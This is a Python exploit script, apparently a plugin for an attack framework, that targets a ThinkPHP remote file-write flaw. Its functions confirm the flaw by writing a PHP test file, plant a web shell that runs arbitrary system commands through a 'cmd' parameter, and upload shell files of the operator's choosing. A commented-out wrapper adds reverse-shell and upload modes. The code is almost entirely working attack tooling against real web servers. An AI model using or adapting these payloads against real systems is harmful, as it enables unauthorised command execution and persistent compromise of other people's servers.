# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}


def exp_check(url):
    try:

        requests.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=xh.php&content=%3C?php%20var_dump(xiaohei);?%3E",headers=heads,verify=False)
        rp = requests.get(url + "/xh.php",headers=headers,verify=False)
        if rp.status_code==200 and 'xiaohei' in rp.text:
            return 1
        return 2
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3



def exp_cmd(url,cmd):
    try:
        requests.get(url+ "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=xhml.php&content=%3C?php%20system($_GET['cmd']);?%3E",headers=headers,verify=False)
        rp = requests.get(url+"/xhml.php?cmd="+cmd,headers=headers,verify=False)
        if rp.text != "":
            return rp.text
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3


def exp_upload(url,data,shellname):
    try:
        payload = "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile={0}&content={1}".format(shellname,data)
        requests.get((url+payload),headers=headers,verify=False)
        rep = requests.get(url+"/{}".format(shellname),headers=headers,verify=False)
        if rep.status_code == 200:
            if rep.text == "":
                result = ("上传成功 \n"
                          "路径为 {0}/{1}".format(url,shellname))
                return result
    except:
        return 3



# def do_exp(url,hostname,port,scheme,heads={},exp_data={}):
#     try:
#         # 返回参数
#         #Result返回是否成功，
#         #Result_Info为返回的信息，可以为Paylaod
#         #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
#         #Error_Info无论何时都会输出
#         result = {"Result":False,"Result_Info":"payload","Debug_Info":"","Error_Info":""}
#         #命令执行
#         if exp_data['type']=='cmd':
#             requests.get(url + "/index.php?s=index/\\think\\template\\driver\\file/write&cacheFile=xhml.php&content=%3C?php%20system($_GET['cmd']);?%3E",headers=heads,verify=False)
#             rp = requests.get(url + "/xhml.php?cmd="+exp_data['command'],headers=heads,verify=False)
#             if  rp.text!="":
#                 result['Result'] = True
#                 result['Result_Info'] = rp.text
#         #反弹shell
#         if exp_data['type']=='shell':
#             result['Result'] = True
#             result['Result_Info'] = "反弹成功"
#         #上传文件
#         if exp_data['type']=='uploadfile':
#             result['Result'] = True
#             result['Result_Info'] = "上传成功"
#
#     except Exception as e:
#         result['Error_Info'] = str(e)+str(e.__traceback__.tb_lineno)+'行'
#     return result



